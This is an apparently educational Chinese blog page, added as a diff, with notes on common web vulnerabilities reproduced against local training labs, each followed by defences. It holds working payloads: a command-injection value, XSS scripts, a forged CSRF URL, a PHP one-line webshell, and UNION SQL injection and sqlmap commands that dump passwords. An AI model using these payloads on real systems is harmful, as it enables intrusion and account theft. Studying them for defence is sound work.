@@ -1,0 +1,425 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon-16x16.png?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon-32x32.png?v=2.6.2" type="image/png" sizes="32x32"><meta name="description" content="WEB漏洞                           暴力破解                           原理       通过尝试所有可能的组合来破解密码或密钥的攻击方式                     攻击方式       攻击者使用burpsuite和预先准备好的字典文件进行攻击 利用burpsuite抓包发送到攻击器→选好">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PiDan-007">
+<meta property="og:url" content="https://pidan-007.github.io/2024/06/07/WEB%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="PiDan-007">
+<meta property="og:description" content="WEB漏洞                           暴力破解                           原理       通过尝试所有可能的组合来破解密码或密钥的攻击方式                     攻击方式       攻击者使用burpsuite和预先准备好的字典文件进行攻击 利用burpsuite抓包发送到攻击器→选好">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406070921583.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406070933584.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406070953323.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406070957619.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406070958218.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406071005701.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406071010432.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406071039869.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406071041025.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406071047236.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406071052260.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406071057848.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406071102172.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406071105378.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406071124947.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406071333387.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406071434020.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406071435339.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406071435384.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406071435363.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406071435367.png">
+<meta property="article:published_time" content="2024-06-07T02:56:58.159Z">
+<meta property="article:modified_time" content="2024-06-19T08:26:14.879Z">
+<meta property="article:author" content="PiDan-007">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406070921583.png"><title>[ Untitled ] | PiDan-007</title><link ref="canonical" href="https://pidan-007.github.io/2024/06/07/WEB%E6%BC%8F%E6%B4%9E/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.2"><script>var Stun = window.Stun || {};
+var CONFIG = {
+  root: '/',
+  algolia: undefined,
+  assistSearch: undefined,
+  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
+  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
+  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
+  postWidget: {"endText":true},
+  nightMode: {"enable":true},
+  back2top: {"enable":true},
+  codeblock: {"style":"default","highlight":"light","wordWrap":false},
+  reward: false,
+  fancybox: false,
+  zoomImage: {"gapAside":"20px"},
+  galleryWaterfall: undefined,
+  lazyload: false,
+  pjax: undefined,
+  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
+  shortcuts: undefined,
+  prompt: {"copyButton":"Copy","copySuccess":"Copy Success","copyError":"Copy Error"},
+  sourcePath: {"js":"js","css":"css","images":"images"},
+};
+
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.0.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">Home</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">Archives</span></a></div></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">PiDan-007</div><div class="header-banner-info__subtitle"></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">[ Untitled ]</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2024-06-07</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2024-06-19</span></span></div></header><div class="post-body">
+        <h1 id="WEB漏洞"   >
+          <a href="#WEB漏洞" class="heading-link"><i class="fas fa-link"></i></a><a href="#WEB漏洞" class="headerlink" title="WEB漏洞"></a>WEB漏洞</h1>
+      
+        <h2 id="暴力破解"   >
+          <a href="#暴力破解" class="heading-link"><i class="fas fa-link"></i></a><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h2>
+      
+        <h4 id="原理"   >
+          <a href="#原理" class="heading-link"><i class="fas fa-link"></i></a><a href="#原理" class="headerlink" title="原理"></a>原理</h4>
+      <p>通过尝试所有可能的组合来破解密码或密钥的攻击方式</p>
+
+        <h4 id="攻击方式"   >
+          <a href="#攻击方式" class="heading-link"><i class="fas fa-link"></i></a><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h4>
+      <p>攻击者使用burpsuite和预先准备好的字典文件进行攻击</p>
+<p>利用burpsuite抓包发送到攻击器→选好payload位置和攻击方式→上传字典开始攻击→根据长度的特别来获取账号和密码</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406070921583.png" alt="image-20240607092151450"></p>
+
+        <h4 id="防御"   >
+          <a href="#防御" class="heading-link"><i class="fas fa-link"></i></a><a href="#防御" class="headerlink" title="防御"></a>防御</h4>
+      <p>限制登录尝试次数</p>
+<p>启用多因素认证，比如手机验证码、邮件验证码等</p>
+<p>使用强密码策略</p>
+
+        <h2 id="命令注入"   >
+          <a href="#命令注入" class="heading-link"><i class="fas fa-link"></i></a><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h2>
+      
+        <h4 id="原理-1"   >
+          <a href="#原理-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4>
+      <p>通过输入恶意命令，攻击者可以远程执行服务器上的系统命令，出现在应用程序通过系统调用执行操作系统命令，并且没有对输入进行充分的验证和过滤的情况下</p>
+
+        <h4 id="靶场复现"   >
+          <a href="#靶场复现" class="heading-link"><i class="fas fa-link"></i></a><a href="#靶场复现" class="headerlink" title="靶场复现"></a>靶场复现</h4>
+      <p>输入127.0.0.1|dir，查看文件目录</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406070933584.png" alt="image-20240607093339497"></p>
+
+        <h4 id="防御-1"   >
+          <a href="#防御-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#防御-1" class="headerlink" title="防御"></a>防御</h4>
+      <p>对输入进行过滤</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (!preg_match(&#x27;/^[a-zA-Z0-9_\-]+$/&#x27;, $input))</span><br></pre></td></tr></table></div></figure>
+
+
+        <h2 id="XSS"   >
+          <a href="#XSS" class="heading-link"><i class="fas fa-link"></i></a><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2>
+      
+        <h4 id="原理-2"   >
+          <a href="#原理-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#原理-2" class="headerlink" title="原理"></a>原理</h4>
+      <p>指攻击者通过在web页面中写入恶意脚本，进而在用户浏览页面时，控制用户浏览器进行操作的攻击方式</p>
+
+        <h4 id="分类"   >
+          <a href="#分类" class="heading-link"><i class="fas fa-link"></i></a><a href="#分类" class="headerlink" title="分类"></a>分类</h4>
+      <p>反射型XSS、存储型XSS和基于 DOM 的 XSS</p>
+
+        <h4 id="利用方式"   >
+          <a href="#利用方式" class="heading-link"><i class="fas fa-link"></i></a><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h4>
+      <p>在输入框中插入脚本，如<code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code></p>
+<p>效果如图</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406070953323.png" alt="image-20240607095306223"></p>
+
+        <h4 id="防御-2"   >
+          <a href="#防御-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#防御-2" class="headerlink" title="防御"></a>防御</h4>
+      <p>对用户输入进行严格的转义和过滤</p>
+<p>将用户输入的数据进行编码，可以使用htmlspecialchars()函数，将特殊字符转换为HTML实体</p>
+<p>浏览器CSP策略</p>
+
+        <h2 id="CSRF"   >
+          <a href="#CSRF" class="heading-link"><i class="fas fa-link"></i></a><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2>
+      
+        <h4 id="原理-3"   >
+          <a href="#原理-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#原理-3" class="headerlink" title="原理"></a>原理</h4>
+      <p>利用用户对目标网站的信任，当用户在已登录状态下访问恶意网站时，恶意网站向目标网站发送伪造的请求，欺骗用户点击恶意链接，执行用户未授权的操作</p>
+
+        <h4 id="靶场复现-1"   >
+          <a href="#靶场复现-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#靶场复现-1" class="headerlink" title="靶场复现"></a>靶场复现</h4>
+      <p>修改密码的题，只要登录之后，输入修改后的密码两次就能改掉密码</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406070957619.png" alt="image-20240607095729552"></p>
+<p>密码修改后能看到网址已经改变为</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/DVWA-master/vulnerabilities/csrf/?password_new=123&amp;password_conf=123&amp;Change=Change#</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406070958218.png" alt="image-20240607095828143"></p>
+<p>因此只要让受害者访问这个网址就可以把受害者的密码成功修改</p>
+<p>（但其实用户一看这个网址就会觉得奇怪，所以可以将这个网址变成一个短网址掩饰一下）</p>
+
+        <h4 id="防御-3"   >
+          <a href="#防御-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#防御-3" class="headerlink" title="防御"></a>防御</h4>
+      <p>在表单中加入CSRF Token（但也可以通过使用 XSS 来获取用户的 token ，然后将 token 放到 CSRF 的请求中，就可以完成修改密码的操作，可以去构造一个攻击脚本，脚本的作用就是获取用户token然后修改密码，将其放置在存储型XSS中，只要用户点击存储型XSS页面，就会完成CSRF攻击，即修改密码）</p>
+<p>检查请求的来源</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$referer = $_SERVER[&#x27;HTTP_REFERER&#x27;];</span><br><span class="line">if (strpos($referer, &#x27;https://yourdomain.com&#x27;) !== 0)</span><br></pre></td></tr></table></div></figure>
+
+
+
+
+        <h2 id="文件包含"   >
+          <a href="#文件包含" class="heading-link"><i class="fas fa-link"></i></a><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2>
+      
+        <h4 id="原理-4"   >
+          <a href="#原理-4" class="heading-link"><i class="fas fa-link"></i></a><a href="#原理-4" class="headerlink" title="原理"></a>原理</h4>
+      <p>应用程序通过用户输入的文件路径来动态包含和执行文件，攻击者通过操控这些输入，能够访问或执行服务器上未授权的文件，甚至执行恶意代码</p>
+
+        <h4 id="靶场复现-2"   >
+          <a href="#靶场复现-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#靶场复现-2" class="headerlink" title="靶场复现"></a>靶场复现</h4>
+      
+        <h5 id="本地"   >
+          <a href="#本地" class="heading-link"><i class="fas fa-link"></i></a><a href="#本地" class="headerlink" title="本地"></a>本地</h5>
+      <p>随便选择一个提交，可以在url上看到这是一个文件file2.php</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406071005701.png" alt="image-20240607100511598"></p>
+<p>在Unsafe Fileupload处随便选一道题上传带有phpinfo()的图片文件info.jpg（这里是用的getimagesize题里的）</p>
+<p>上传后复制路径回到题目，将路径复制到题目中</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/pikachu/vul/fileinclude/fi_local.php?filename=../../unsafeupload/uploads/2024/06/07/23294766626ba793a22727627205.jpg&amp;submit=%E6%8F%90%E4%BA%A4</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406071010432.png" alt="image-20240607101057352"></p>
+
+        <h5 id="远程"   >
+          <a href="#远程" class="heading-link"><i class="fas fa-link"></i></a><a href="#远程" class="headerlink" title="远程"></a>远程</h5>
+      <p>随便选择一个提交</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406071039869.png" alt="image-20240607103937843"></p>
+<p>把参数<code>filename</code>值改为<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.bilibili.com/" >https://www.bilibili.com/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406071041025.png" alt="image-20240607104151936"></p>
+
+        <h4 id="防御-4"   >
+          <a href="#防御-4" class="heading-link"><i class="fas fa-link"></i></a><a href="#防御-4" class="headerlink" title="防御"></a>防御</h4>
+      <p>输入验证和过滤</p>
+<p>设置白名单</p>
+<p>禁用远程文件包含</p>
+
+        <h2 id="文件上传"   >
+          <a href="#文件上传" class="heading-link"><i class="fas fa-link"></i></a><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2>
+      
+        <h4 id="原理-5"   >
+          <a href="#原理-5" class="heading-link"><i class="fas fa-link"></i></a><a href="#原理-5" class="headerlink" title="原理"></a>原理</h4>
+      <p>通过上传包含恶意代码的文件，利用服务器对上传文件处理的不当，执行恶意代码或访问未授权的文件</p>
+
+        <h4 id="靶场复现-3"   >
+          <a href="#靶场复现-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#靶场复现-3" class="headerlink" title="靶场复现"></a>靶场复现</h4>
+      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406071047236.png" alt="image-20240607104742196"></p>
+<p>上传写有一句话木马的jpg文件，同时抓包发送到Repeater，将文件后缀修改为php</p>
+<p><code>GIF89a &lt;?php @eval($_REQUEST[&#39;cmd&#39;])?&gt;</code></p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406071052260.png" alt="image-20240607105252170"></p>
+<p>发送后得到上传路径 uploads/test.php，按这个路径到蚁剑进行连接</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406071057848.png" alt="image-20240607105759778"></p>
+<p>添加数据，拿到shell</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406071102172.png" alt="image-20240607110217115"></p>
+
+        <h4 id="防御-5"   >
+          <a href="#防御-5" class="heading-link"><i class="fas fa-link"></i></a><a href="#防御-5" class="headerlink" title="防御"></a>防御</h4>
+      <p>生成唯一目标文件名，以避免文件名冲突或敏感信息泄露</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$target_file = md5( uniqid() . $uploaded_name ) . &#x27;.&#x27; . $uploaded_ext;</span><br></pre></td></tr></table></div></figure>
+
+<p>限制上传文件类型和大小</p>
+<p>验证文件内容，使用 <code>getimagesize</code> 函数检查图像文件的真实性</p>
+
+        <h2 id="SQL注入"   >
+          <a href="#SQL注入" class="heading-link"><i class="fas fa-link"></i></a><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2>
+      
+        <h4 id="原理-6"   >
+          <a href="#原理-6" class="heading-link"><i class="fas fa-link"></i></a><a href="#原理-6" class="headerlink" title="原理"></a>原理</h4>
+      <p>通过向应用程序发送恶意构造的SQL语句，操控数据库执行未授权的操作，常发生在应用程序未对用户输入进行充分验证和过滤的情况下</p>
+
+        <h4 id="分类-1"   >
+          <a href="#分类-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#分类-1" class="headerlink" title="分类"></a>分类</h4>
+      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406071105378.png" alt="image-20240607110545309"></p>
+
+        <h4 id="注入过程"   >
+          <a href="#注入过程" class="heading-link"><i class="fas fa-link"></i></a><a href="#注入过程" class="headerlink" title="注入过程"></a>注入过程</h4>
+      <p><code>SELECT \* FROM users WHERE username = &#39;$username&#39; AND password = &#39;$password&#39;;</code></p>
+
+        <h5 id="手工注入"   >
+          <a href="#手工注入" class="heading-link"><i class="fas fa-link"></i></a><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h5>
+      
+        <h6 id="判断类型（数字型or字符型）"   >
+          <a href="#判断类型（数字型or字符型）" class="heading-link"><i class="fas fa-link"></i></a><a href="#判断类型（数字型or字符型）" class="headerlink" title="判断类型（数字型or字符型）"></a>判断类型（数字型or字符型）</h6>
+      
+        <h6 id="查看列数（以字符型为例）"   >
+          <a href="#查看列数（以字符型为例）" class="heading-link"><i class="fas fa-link"></i></a><a href="#查看列数（以字符型为例）" class="headerlink" title="查看列数（以字符型为例）"></a>查看列数（以字符型为例）</h6>
+      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x27; union select 1,2;#</span><br><span class="line">&#x27; union select 1,2,3;#</span><br><span class="line">......</span><br><span class="line">依次递增测试直到报错</span><br></pre></td></tr></table></div></figure>
+
+
+        <h6 id="获取数据库名（以2列为例）"   >
+          <a href="#获取数据库名（以2列为例）" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取数据库名（以2列为例）" class="headerlink" title="获取数据库名（以2列为例）"></a>获取数据库名（以2列为例）</h6>
+      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;union select 1,group_concat(schema_name) from information_schema.schemata;#</span><br></pre></td></tr></table></div></figure>
+
+
+        <h6 id="获取表名"   >
+          <a href="#获取表名" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h6>
+      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#x27;数据库名&#x27;;#</span><br></pre></td></tr></table></div></figure>
+
+
+        <h6 id="获取表字段名"   >
+          <a href="#获取表字段名" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取表字段名" class="headerlink" title="获取表字段名"></a>获取表字段名</h6>
+      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_schema=&#x27;数据库名&#x27; and table_name=&#x27;表名&#x27;;#</span><br></pre></td></tr></table></div></figure>
+
+
+        <h6 id="获取字段内容"   >
+          <a href="#获取字段内容" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取字段内容" class="headerlink" title="获取字段内容"></a>获取字段内容</h6>
+      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; union select 1,group_concat(user,password) from 数据库名.表名;#</span><br></pre></td></tr></table></div></figure>
+
+
+        <h5 id="Sqlmap（以DVWA靶场为例）"   >
+          <a href="#Sqlmap（以DVWA靶场为例）" class="heading-link"><i class="fas fa-link"></i></a><a href="#Sqlmap（以DVWA靶场为例）" class="headerlink" title="Sqlmap（以DVWA靶场为例）"></a>Sqlmap（以DVWA靶场为例）</h5>
+      <p>在Sqlmap文件夹打开终端</p>
+
+        <h6 id="获取数据库名"   >
+          <a href="#获取数据库名" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取数据库名" class="headerlink" title="获取数据库名"></a>获取数据库名</h6>
+      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;PHPSESSID=br1j226plrlouaqoj959c5nu7s; security=low&quot; --dbs</span><br></pre></td></tr></table></div></figure>
+
+
+        <h6 id="获取表名-1"   >
+          <a href="#获取表名-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取表名-1" class="headerlink" title="获取表名"></a>获取表名</h6>
+      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;PHPSESSID=br1j226plrlouaqoj959c5nu7s; security=low&quot; -D dvwa --tables</span><br></pre></td></tr></table></div></figure>
+
+
+        <h6 id="获取表字段名-1"   >
+          <a href="#获取表字段名-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取表字段名-1" class="headerlink" title="获取表字段名"></a>获取表字段名</h6>
+      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;PHPSESSID=br1j226plrlouaqoj959c5nu7s; security=low&quot; -D dvwa -T users --columns</span><br></pre></td></tr></table></div></figure>
+
+
+        <h6 id="获取字段内容-1"   >
+          <a href="#获取字段内容-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取字段内容-1" class="headerlink" title="获取字段内容"></a>获取字段内容</h6>
+      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;PHPSESSID=br1j226plrlouaqoj959c5nu7s; security=low&quot; -D dvwa -T users -C user,password --dump </span><br></pre></td></tr></table></div></figure>
+
+
+        <h4 id="防御-6"   >
+          <a href="#防御-6" class="heading-link"><i class="fas fa-link"></i></a><a href="#防御-6" class="headerlink" title="防御"></a>防御</h4>
+      <p>使用预处理语句和参数化查询来避免SQL注入</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$stmt = $conn-&gt;prepare(&quot;SELECT * FROM users WHERE username = ? AND password = ?&quot;);</span><br><span class="line">$stmt-&gt;bind_param(&quot;ss&quot;, $user, $pass); // &#x27;ss&#x27; 表示两个参数都是字符串类型</span><br><span class="line"></span><br><span class="line">// 执行预处理语句</span><br><span class="line">$stmt-&gt;execute();</span><br><span class="line">$result = $stmt-&gt;get_result();</span><br></pre></td></tr></table></div></figure>
+
+
+
+
+        <h2 id="反序列化"   >
+          <a href="#反序列化" class="heading-link"><i class="fas fa-link"></i></a><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2>
+      
+        <h3 id="PHP反序列化"   >
+          <a href="#PHP反序列化" class="heading-link"><i class="fas fa-link"></i></a><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h3>
+      
+        <h4 id="原理-7"   >
+          <a href="#原理-7" class="heading-link"><i class="fas fa-link"></i></a><a href="#原理-7" class="headerlink" title="原理"></a>原理</h4>
+      <p>攻击者向应用程序提供恶意序列化数据，利用应用程序在反序列化过程中未正确验证或过滤数据的漏洞，从而导致安全问题</p>
+
+        <h4 id="靶场复现-4"   >
+          <a href="#靶场复现-4" class="heading-link"><i class="fas fa-link"></i></a><a href="#靶场复现-4" class="headerlink" title="靶场复现"></a>靶场复现</h4>
+      <p>靶场源代码</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">class S&#123;</span><br><span class="line">    var $test = &quot;pikachu&quot;;</span><br><span class="line">    function __construct()&#123;</span><br><span class="line">        echo $this-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">//O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:29:&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;;&#125;</span><br><span class="line">$html=&#x27;&#x27;;</span><br><span class="line">if(isset($_POST[&#x27;o&#x27;]))&#123;</span><br><span class="line">    $s = $_POST[&#x27;o&#x27;];</span><br><span class="line">    if(!@$unser = unserialize($s))&#123;</span><br><span class="line">        $html.=&quot;&lt;p&gt;大兄弟,来点劲爆点儿的!&lt;/p&gt;&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $html.=&quot;&lt;p&gt;&#123;$unser-&gt;test&#125;&lt;/p&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
+
+<p>这里定义了一个名为 <code>S</code> 的类，包含一个公开变量 <code>$test</code>，初始值为 <code>pikachu</code>    ,构造函数 <code>__construct()</code> 在对象被创建时自动调用，用来输出 <code>$test</code> 变量的值</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406071124947.png" alt="image-20240607112450870"></p>
+<p>构造一个序列化数据</p>
+<p>根据源代码，我们构造时要注意类名为<code>S</code>，变量名为<code>test</code></p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class S &#123;</span><br><span class="line">    public $test = &quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$test = new S();</span><br><span class="line">// 序列化</span><br><span class="line">$serialized = serialize($test);</span><br><span class="line">echo $serialized;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></div></figure>
+
+<p>运行得到输出</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:29:&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;;&#125;</span><br></pre></td></tr></table></div></figure>
+
+<p>填写到框内提交</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406071333387.png" alt="image-20240607133314314"></p>
+
+        <h4 id="防御-7"   >
